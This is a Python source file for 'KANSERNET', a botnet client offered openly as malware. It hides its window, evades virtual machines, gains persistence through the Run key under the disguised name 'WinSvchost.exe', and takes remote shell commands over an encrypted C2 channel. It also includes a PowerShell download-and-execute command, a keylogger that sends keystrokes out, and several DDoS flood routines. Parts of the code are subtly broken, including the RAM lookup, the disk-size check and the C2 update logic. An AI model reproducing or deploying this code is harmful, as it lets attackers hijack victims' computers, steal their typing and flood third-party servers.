#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSERNET v1.0 — Bot Client (Zombie)
Encrypted C2, DDoS engine, persistence, anti-analysis
"""
import os, sys, json, socket, threading, time, base64, hashlib, random, string, platform, subprocess, shutil, ctypes, tempfile
from datetime import datetime

C2_HOST = "127.0.0.1"
C2_PORT = 6666
PASSWORD = "kansernet2026"
AES_KEY = hashlib.sha256(PASSWORD.encode()).digest()
BOT_ID = hashlib.md5((platform.node() + str(os.getpid())).encode()).hexdigest()[:10]
RECONNECT = 10

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as sym_padding
    from cryptography.hazmat.backends import default_backend
except:
    print("[!] cryptography required")
    sys.exit(1)

def encrypt(data):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(data.encode()) + padder.finalize()
    return base64.b64encode(iv + encryptor.update(padded) + encryptor.finalize()).decode()

def decrypt(enc_data):
    raw = base64.b64decode(enc_data)
    iv, ct = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ct) + decryptor.finalize()
    unpadder = sym_padding.PKCS7(128).unpadder()
    return (unpadder.update(padded) + unpadder.finalize()).decode()

def sysinfo():
    return {
        "hostname": platform.node(), "os": f"{platform.system()} {platform.release()}",
        "user": os.getenv("USERNAME", "?"), "cpu": os.cpu_count() or 0,
        "ram": round((lambda: __import__('ctypes').windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m)))() if False else 0 or 4, 1),
        "pid": os.getpid()
    }

def anti_analysis():
    """VM/Sandbox tespiti"""
    if os.path.getsize("C:\\") < 30 * 1024 * 1024 * 1024: return True
    vm_files = ["C:\\Windows\\System32\\drivers\\vmmouse.sys", "C:\\Windows\\System32\\drivers\\VBoxMouse.sys"]
    if any(os.path.exists(f) for f in vm_files): return True
    try:
        out = subprocess.check_output("tasklist", shell=True, timeout=3).decode(errors="ignore").lower()
        if any(p in out for p in ["vmtoolsd", "vboxservice"]): return True
    except: pass
    return False

def install_persist():
    try:
        exe = sys.executable
        dst = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WinSvchost.exe")
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        shutil.copy2(exe, dst)
        subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinServiceHost" /t REG_SZ /d "{dst}" /f', shell=True, capture_output=True)
    except: pass

def remove_persist():
    try:
        subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinServiceHost" /f', shell=True, capture_output=True)
        dst = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WinSvchost.exe")
        if os.path.exists(dst): os.remove(dst)
    except: pass

def ddos_http(target, duration):
    """HTTP Flood"""
    end = time.time() + duration
    count = 0
    url = target if target.startswith("http") else f"http://{target}"
    while time.time() < end:
        for _ in range(10):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                host = url.replace("https://","").replace("http://","").split("/")[0]
                port = 443 if url.startswith("https") else 80
                s.connect((host, port))
                s.send(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(['Mozilla/5.0','Chrome/120','Safari/17'])}\r\nConnection: keep-alive\r\n\r\n".encode())
                count += 1
            except: pass
        time.sleep(0.05)
    return count

def ddos_udp(target, duration):
    """UDP Flood"""
    end = time.time() + duration
    count = 0
    host, port = (target.split(":") + ["80"])[:2]
    port = int(port)
    data = os.urandom(1024)
    while time.time() < end:
        for _ in range(20):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (host, port))
                count += 1
            except: pass
        time.sleep(0.01)
    return count

def ddos_tcp(target, duration):
    """TCP SYN Flood"""
    end = time.time() + duration
    count = 0
    host, port = (target.split(":") + ["80"])[:2]
    port = int(port)
    while time.time() < end:
        for _ in range(30):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((host, port))
                s.send(os.urandom(512))
                count += 1
            except: pass
        time.sleep(0.02)
    return count

def ddos_slowloris(target, duration):
    """Slowloris — keep-alive connections"""
    end = time.time() + duration
    sockets_list = []
    host = target.replace("https://","").replace("http://","").split("/")[0]
    port = 443 if target.startswith("https") else 80
    while time.time() < end and len(sockets_list) < 200:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.send(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
            sockets_list.append(s)
        except: pass
        time.sleep(0.1)
    time.sleep(duration - (time.time() - (end - duration)))
    for s in sockets_list:
        try: s.close()
        except: pass
    return len(sockets_list)

def ddos_dns(target, duration):
    """DNS Amplification"""
    end = time.time() + duration
    count = 0
    host = target
    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + b''.join(bytes([len(p)]) + p.encode() for p in host.split('.')) + b'\x00\x00\x01\x00\x01'
    resolvers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
    while time.time() < end:
        for _ in range(50):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(query, (random.choice(resolvers), 53))
                count += 1
            except: pass
        time.sleep(0.02)
    return count

DDoS_MAP = {"HTTP": ddos_http, "HTTPS": ddos_http, "UDP": ddos_udp, "TCP": ddos_tcp, "Slowloris": ddos_slowloris, "DNS": ddos_dns}

def main():
    if os.name == "nt":
        try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass

    if anti_analysis():
        time.sleep(random.randint(60, 300))

    install_persist()

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((C2_HOST, C2_PORT))

            hello = encrypt(json.dumps({"id": BOT_ID, "info": sysinfo()}))
            sock.send(hello.encode())

            threading.Thread(target=_heartbeat, args=(sock,), daemon=True).start()
            buf = ""
            while True:
                data = sock.recv(65536).decode(errors="ignore")
                if not data: break
                buf += data
                try:
                    msg = json.loads(decrypt(buf))
                    buf = ""
                    cmd = msg.get("cmd", "")
                    val = msg.get("data", "")

                    if cmd == "shell":
                        try:
                            out = subprocess.check_output(val, shell=True, stderr=subprocess.STDOUT, timeout=15).decode(errors="ignore")
                            sock.send(encrypt(json.dumps({"type": "shell", "data": out[:3000]})).encode())
                        except Exception as e:
                            sock.send(encrypt(json.dumps({"type": "shell", "data": str(e)})).encode())

                    elif cmd == "ddos":
                        ddos_info = json.loads(val)
                        target = ddos_info["target"]
                        method = ddos_info["method"]
                        dur = min(ddos_info["duration"], 300)
                        fn = DDoS_MAP.get(method, ddos_http)
                        count = fn(target, dur)
                        sock.send(encrypt(json.dumps({"type": "ddos_done", "data": f"{method} {target}: {count} requests"})).encode())

                    elif cmd == "download_exec":
                        try:
                            subprocess.run(f"powershell -c \"Invoke-WebRequest -Uri '{val}' -OutFile $env:TEMP\\update.exe; Start-Process $env:TEMP\\update.exe\"", shell=True)
                        except: pass

                    elif cmd == "visit":
                        try:
                            import urllib.request
                            urllib.request.urlopen(val, timeout=10)
                        except: pass

                    elif cmd == "update":
                        try:
                            C2_HOST, C2_PORT = val.split(":") if ":" in val else (val, C2_PORT)
                            C2_PORT = int(C2_PORT)
                            sock.close(); break
                        except: pass

                    elif cmd == "keylog_start":
                        threading.Thread(target=_keylog_thread, args=(sock,), daemon=True).start()

                    elif cmd == "uninstall":
                        remove_persist()
                        sock.send(encrypt(json.dumps({"type": "status", "data": "uninstalled"})).encode())

                    elif cmd == "kill":
                        sock.close()
                        sys.exit(0)

                except: pass
        except:
            time.sleep(RECONNECT)
        finally:
            try: sock.close()
            except: pass

def _heartbeat(sock):
    while True:
        try: sock.send(encrypt(json.dumps({"type": "heartbeat"})).encode())
        except: break
        time.sleep(30)

def _keylog_thread(sock):
    try:
        import pynput.keyboard
        log = []
        def on_press(key):
            try: log.append(key.char)
            except: log.append(f"[{key}]")
            if len(log) >= 30:
                try: sock.send(encrypt(json.dumps({"type": "keylog", "data": "".join(log)})).encode())
                except: pass
                log.clear()
        listener = pynput.keyboard.Listener(on_press=on_press)
        listener.start()
        while True: time.sleep(10)
    except: pass

if __name__ == "__main__":
    main()
